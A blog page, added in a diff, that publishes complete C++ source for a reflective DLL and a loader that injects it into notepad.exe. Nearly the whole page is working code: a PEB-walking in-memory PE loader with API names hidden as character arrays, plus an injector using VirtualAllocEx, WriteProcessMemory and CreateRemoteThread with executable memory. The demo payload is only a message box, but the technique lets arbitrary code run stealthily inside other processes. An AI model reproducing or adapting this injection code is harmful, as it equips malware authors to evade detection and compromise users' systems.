@@ -1,0 +1,313 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reflective_Dll source code</title>
+    <link rel="stylesheet" href="../style.css">
+    <script src="../highlight.js"></script>
+    <script src="../languages.js"></script>
+    <script>
+        hljs.highlightAll();
+    </script>
+</head>
+<body>
+    <h1 style="text-align: left;">
+        <a href="../index.html" style="text-decoration: none; color: grey;">KhoaLeDang's Blog</a>
+    </h1>
+    <p>
+        <a href="../ReflectiveDLL.html">Go back</a>
+    </p>
+    <h1>REFLECTIVE_DLL SOURCE</h1>
+<pre class="codeblock"><code class="language-cpp">
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h" // windows.h winternl.h and intrin.h
+#pragma optimize("", off)
+typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
+    PVOID Reserved1[2];
+    LIST_ENTRY InMemoryOrderLinks;
+    PVOID Reserved2[2];
+    PVOID DllBase;
+    PVOID Reserved3[2];
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    PVOID Reserved5[2];
+#pragma warning(push)
+#pragma warning(disable: 4201)
+    union {
+        ULONG CheckSum;
+        PVOID Reserved6;
+    } DUMMYUNIONNAME;
+#pragma warning(pop)
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY_CUSTOM, * PLDR_DATA_TABLE_ENTRY_CUSTOM;
+int my_strcmp(const char* s1, const char* s2) {
+    while (*s1 && (*s1 == *s2)) {
+        s1++; s2++;
+    }
+    return (unsigned char)*s1 - (unsigned char)*s2;
+};
+int my_wcscmp(const wchar_t* s1, const wchar_t* s2)
+{
+    while (*s1 && (*s1 == *s2))
+    {
+        s1++;
+        s2++;
+    }
+
+    return (wchar_t)*s1 - (wchar_t)*s2;
+};
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, "Hello !", "Reflective DLL", MB_OK);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+PVOID search_dll_base(WCHAR* dll_name) {
+
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    PPEB_LDR_DATA ldr = peb->Ldr;
+    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* current = head->Flink;
+    while (current != head) {
+        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
+        if (my_wcscmp(dll_name, entry->BaseDllName.Buffer) == 0)
+        {
+            return entry->DllBase;
+        }
+        current = current->Flink;
+    }
+    return NULL;
+}
+FARPROC search_function(PVOID dll_base, char* fnName) {
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_base + dos->e_lfanew);
+    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY exprt = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dll_base + export_rva);
+    DWORD* names = (DWORD*)((BYTE*)dll_base + exprt->AddressOfNames);
+    DWORD* funcs = (DWORD*)((BYTE*)dll_base + exprt->AddressOfFunctions);
+    WORD* ordinals = (WORD*)((BYTE*)dll_base + exprt->AddressOfNameOrdinals);
+    for (size_t i = 0; i < exprt->NumberOfNames; i++)
+    {
+        char* name = (char*)((BYTE*)dll_base + names[i]);
+        if (my_strcmp(name, fnName) == 0)
+        {
+            return (FARPROC)((BYTE*)dll_base + funcs[ordinals[i]]);
+        }
+    }
+    return NULL;
+
+}
+extern "C" __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
+    WCHAR szKernel32[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
+    char get_proc_address[] = {
+    'G','e','t',
+    'P','r','o','c',
+    'A','d','d','r','e','s','s',
+    '\0'
+    };
+    char virtual_alloc[] = {
+     'V','i','r','t','u','a','l',
+     'A','l','l','o','c',
+     '\0'
+    };
+    char load_library_a[] = {
+    'L','o','a','d',
+    'L','i','b','r','a','r','y',
+    'A',
+    '\0'
+    };
+    PVOID kernel32_base = NULL;
+    kernel32_base = search_dll_base(szKernel32);
+    decltype(&LoadLibraryA) LoadLibraryA = (decltype(LoadLibraryA))search_function(kernel32_base, load_library_a);
+    decltype(&GetProcAddress) GetProcAddress = (decltype(GetProcAddress))search_function(kernel32_base, get_proc_address);
+    decltype(&VirtualAlloc) VirtualAlloc = (decltype(VirtualAlloc))search_function(kernel32_base, virtual_alloc);
+    ULONG_PTR dll_base = (ULONG_PTR)lpParameter;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_base + dos->e_lfanew);
+    DWORD size_of_image = nt->OptionalHeader.SizeOfImage;
+    LPVOID mem = VirtualAlloc(NULL, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    DWORD size_of_headers = nt->OptionalHeader.SizeOfHeaders;
+    for (size_t i = 0; i < size_of_headers; i++)
+    {
+        ((BYTE*)mem)[i] = ((BYTE*)dll_base)[i];
+    }
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (size_t i = 0; i < nt->FileHeader.NumberOfSections; i++)
+    {
+        if (section[i].SizeOfRawData > 0) {
+            BYTE* dest = (BYTE*)mem + section[i].VirtualAddress;
+            BYTE* source = (BYTE*)dll_base + section[i].PointerToRawData;
+            DWORD size = section[i].SizeOfRawData;
+            for (size_t j = 0; j < size; j++)
+            {
+                dest[j] = source[j];
+            }
+        }
+    }
+    PIMAGE_DATA_DIRECTORY import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (import_dir->Size > 0)
+    {
+        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)mem + import_dir->VirtualAddress);
+        while (import_desc->Name != 0) {
+            char* dll_name = (char*)((BYTE*)mem + import_desc->Name);
+            HMODULE dll = LoadLibraryA(dll_name);
+            PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)((BYTE*)mem + import_desc->OriginalFirstThunk);
+            PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((BYTE*)mem + import_desc->FirstThunk);
+            if (import_desc->OriginalFirstThunk == 0)
+            {
+                original_thunk = first_thunk;
+            }
+            while (original_thunk->u1.AddressOfData != 0) {
+                FARPROC func_address = NULL;
+                if (IMAGE_SNAP_BY_ORDINAL(original_thunk->u1.Ordinal))
+                {
+                    LPCSTR ordinal = (LPCSTR)IMAGE_ORDINAL(original_thunk->u1.Ordinal);
+                    func_address = GetProcAddress(dll, ordinal);
+                }
+                else
+                {
+                    PIMAGE_IMPORT_BY_NAME name_data = (PIMAGE_IMPORT_BY_NAME)((BYTE*)mem + original_thunk->u1.AddressOfData);
+                    func_address = GetProcAddress(dll, name_data->Name);
+                }
+                first_thunk->u1.Function = (ULONG_PTR)func_address;
+
+                original_thunk++;
+                first_thunk++;
+            }
+            import_desc++;
+        }
+    }
+    ULONG_PTR delta = (ULONG_PTR)mem - nt->OptionalHeader.ImageBase;
+    if (delta != 0)
+    {
+        PIMAGE_DATA_DIRECTORY reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (reloc_dir->Size > 0)
+        {
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)mem + reloc_dir->VirtualAddress);
+            while (reloc->VirtualAddress != 0) {
+                DWORD entries_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                WORD* reloc_data = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+
+                for (size_t i = 0; i < entries_count; i++) {
+                    WORD type = reloc_data[i] >> 12;
+                    WORD offset = reloc_data[i] & 0x0FFF;
+
+                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
+                        ULONG_PTR* target_address = (ULONG_PTR*)((BYTE*)mem + reloc->VirtualAddress + offset);
+                        *target_address += delta;
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
+            }
+        }
+    }
+
+    DWORD entry_point_rva = nt->OptionalHeader.AddressOfEntryPoint;
+    if (entry_point_rva != 0)
+    {
+        ULONG_PTR entry = (ULONG_PTR)mem + entry_point_rva;
+        typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
+        DLLMAIN dll_main = (DLLMAIN)entry;
+        dll_main((HINSTANCE)mem, DLL_PROCESS_ATTACH, NULL);
+    }
+
+    return (ULONG_PTR)mem;
+}
+</code></pre>
+<h2>LOADER SOURCE</h2>
+<pre class="codeblock"><code class="language-cpp">
+    #include &lt;Windows.h>
+    #include &lt;stdio.h>
+    #include &lt;TlHelp32.h>
+    #define BASE_ADDR (BYTE*)base
+        DWORD FindProcessId(const wchar_t* process_name) {
+            DWORD process_id = 0;
+            HANDLE snapshot_handle = NULL;
+            snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (snapshot_handle != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe32 = { 0 };
+                pe32.dwSize = sizeof(PROCESSENTRY32W);
+                if (Process32FirstW(snapshot_handle, &pe32)) {
+                    do {
+                        if (wcscmp(pe32.szExeFile, process_name) == 0) {
+                            process_id = pe32.th32ProcessID;
+                            break;
+                        }
+                    } while (Process32NextW(snapshot_handle, &pe32));
+                }
+                CloseHandle(snapshot_handle);
+            }
+            return process_id;
+        }
+        DWORD RvaToOffset(PIMAGE_NT_HEADERS nt, DWORD rva) {
+            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+                if (rva >= section[i].VirtualAddress && rva < section[i].VirtualAddress + section[i].Misc.VirtualSize) {
+                    // Offset = RVA - VirtualAddress + PointerToRawData
+                    return rva - section[i].VirtualAddress + section[i].PointerToRawData;
+                }
+            }
+            return 0;
+        }
+        DWORD GetReflectiveLoaderOffset(LPVOID base) {
+            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(BASE_ADDR + dos->e_lfanew);
+            DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+            DWORD export_offset = RvaToOffset(nt, export_rva);
+            PIMAGE_EXPORT_DIRECTORY exprt = (PIMAGE_EXPORT_DIRECTORY)(BASE_ADDR + export_offset);
+            DWORD* names = (DWORD*)(BASE_ADDR + RvaToOffset(nt, exprt->AddressOfNames));
+            DWORD* funcs = (DWORD*)(BASE_ADDR + RvaToOffset(nt, exprt->AddressOfFunctions));
+            WORD* ordinals = (WORD*)(BASE_ADDR + RvaToOffset(nt, exprt->AddressOfNameOrdinals));
+            for (size_t i = 0; i < exprt->NumberOfNames; i++) {
+                char* Name = (char*)(BASE_ADDR + RvaToOffset(nt, names[i]));
+                if (strcmp(Name, "ReflectiveLoader") == 0) {
+                    return RvaToOffset(nt, funcs[ordinals[i]]);
+                }
+            }
+            return 0;
+        }
+        
+        int main() {
+            DWORD targetPID = FindProcessId(L"notepad.exe");
+            const char* dll_path = ("C:\\Users\\kingx\\source\\repos\\Reflective_DLL\\x64\\Release\\Reflective_DLL.dll");
+            HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE)
+            {
+                return 1;
+            }
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            LPVOID localBuffer = HeapAlloc(GetProcessHeap(), 0, fileSize);
+            DWORD bytesRead;
+            ReadFile(hFile, localBuffer, fileSize, &bytesRead, NULL);
+            DWORD loaderOffset = GetReflectiveLoaderOffset(localBuffer);
+            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPID);
+            LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if ((WriteProcessMemory(hProcess, remoteMem, localBuffer, fileSize, NULL))== FALSE)
+            {
+                return 1;
+            }
+            LPTHREAD_START_ROUTINE pRemoteFunc = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteMem + loaderOffset);
+            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteFunc, remoteMem, 0, NULL);
+            WaitForSingleObject(hThread, INFINITE);
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            CloseHandle(hThread);
+            CloseHandle(hProcess);
+            return 0;
+        }
+        
+</code>
+</pre>
+<p>
+    <a href="../ReflectiveDLL.html">Go back</a>
+</p>
+</body>
+</html>
